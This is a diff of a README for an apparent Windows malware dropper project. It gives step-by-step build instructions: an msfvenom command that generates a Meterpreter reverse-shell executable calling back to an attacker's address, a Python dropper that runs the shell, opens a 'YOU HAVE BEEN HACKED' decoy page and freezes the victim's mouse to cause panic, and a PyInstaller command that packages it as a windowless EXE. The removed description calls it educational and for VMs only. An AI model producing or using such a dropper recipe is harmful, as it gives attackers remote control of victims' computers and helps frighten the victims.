@@ -1,2 +1,25 @@
-# Windows-payload-dropper
-Windows Meterpreter payload w/handler including html decoy website with a flashy screen "YOU HAVE BEEN HACKED" upon file execution, Targets mouse may freeze for up to 10 seconds creating panic. This formulated payload is for educational purposes only and is to be tested ethically within a virtual environment on PRACTICE VM's or YOUR OWN DEVICES.
+Build Instructions
+
+1.) Generate Your Reverse Shell
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
+```
+
+2.) Create the Dropper
+
+Use the provided `dropper.py` script. It:
+- Runs `shell.exe`
+- Opens `hacked_template.html`
+- Locks the mouse for a few seconds
+
+3.) Compile to EXE
+
+```bash
+pip install pyinstaller
+pyinstaller --noconsole --onefile dropper.py
+```
+
+4.) Test in a Safe VM
+
+Use a separate Windows VM. DO NOT run on your host.
